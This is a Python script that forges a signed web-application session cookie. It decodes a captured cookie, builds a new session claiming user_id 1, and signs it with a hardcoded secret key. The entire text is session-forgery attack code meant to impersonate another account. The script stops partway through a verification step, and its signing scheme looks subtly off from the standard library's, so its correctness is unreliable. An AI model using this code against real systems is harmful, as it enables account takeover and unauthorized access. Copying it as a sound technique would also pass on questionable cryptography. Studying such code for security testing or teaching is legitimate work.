import base64, json, hashlib, hmac, time

SECRET_KEY = 'G7x7pMBBduHU0HH5avEQ'
captured_cookie = 'eyJfZnJlc2giOmZhbHNlfQ.aVcAlQ._iR0jFMQlN7S10HnF9G9QGAnzec'

# Decode original session
payload_b64, timestamp, signature = captured_cookie.split('.')
padding = 4 - len(payload_b64) % 4
if padding != 4:
    payload_b64 += '=' * padding
decoded = base64.urlsafe_b64decode(payload_b64)
original_session = json.loads(decoded)
print('Original session:', original_session)

# Create forged session
forged_session = {'_fresh': True, '_id': 'a' * 32, 'user_id': 1, '_user_id': 1}
session_json = json.dumps(forged_session, separators=(',', ':'))
payload = base64.urlsafe_b64encode(session_json.encode()).rstrip(b'=').decode('ascii')
timestamp = base64.urlsafe_b64encode(str(int(time.time())).encode()).rstrip(b'=').decode('ascii')
data_to_sign = f'{payload}.{timestamp}'
signer = hmac.new(SECRET_KEY.encode(), data_to_sign.encode(), hashlib.sha1)
signature = base64.urlsafe_b64encode(signer.digest()).rstrip(b'=').decode('ascii')
forged_cookie = f'{payload}.{timestamp}.{signature}'
print('Forged cookie:', forged_cookie)

# Verify
verify_padding = 4 - len(payload) % 4
if verify_padding != 4:
    payload_verify = payload + '=' * verify_padding
else:
    payload_verify = payload
verify_decoded = base64.urlsafe_b64decode(payload_verify)
